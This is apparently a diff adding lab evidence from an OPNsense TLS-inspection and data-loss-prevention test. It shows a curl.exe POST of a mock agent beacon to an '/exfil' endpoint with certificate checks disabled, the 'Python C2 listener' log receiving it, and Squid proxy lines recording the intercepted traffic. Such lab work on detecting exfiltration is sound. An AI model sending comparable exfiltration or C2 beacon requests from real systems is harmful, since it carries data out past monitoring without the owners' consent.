@@ -1,0 +1,20 @@
+##PS C:\Users\adm-jsmith\Downloads\Lab\OPNsense\Evidence\TLS-INSPECTION-DLP> curl.exe -k -i -X POST https://10.0.2.25/exfil -d "agent_id=102&status=online"
+
+HTTP/1.1 200 OK
+Server: BaseHTTP/0.6 Python/3.13.5
+Date: Wed, 07 Oct 2026 22:11:46 GMT
+Content-Type: text/plain
+Content-Length: 22
+Cache-Status: OPNsense.internal;detail=mismatch
+Connection: keep-alive
+
+OK: TLS POST RECEIVED
+
+####Python C2 listener
+[2026-10-07 16:11:46] [EXFIL POST] 26 bytes received:
+agent_id=102&status=online
+[HTTP] "POST /exfil HTTP/1.1" 200 -
+
+##tail -f /var/log/squid/access.log
+1791411107.256     18 192.168.10.50 NONE_NONE/000 0 CONNECT 10.0.2.25:443 - ORIGINAL_DST/10.0.2.25 -
+1791411107.288     31 192.168.10.50 TCP_MISS/200 233 POST https://10.0.2.25/exfil - ORIGINAL_DST/10.0.2.25 text/plain
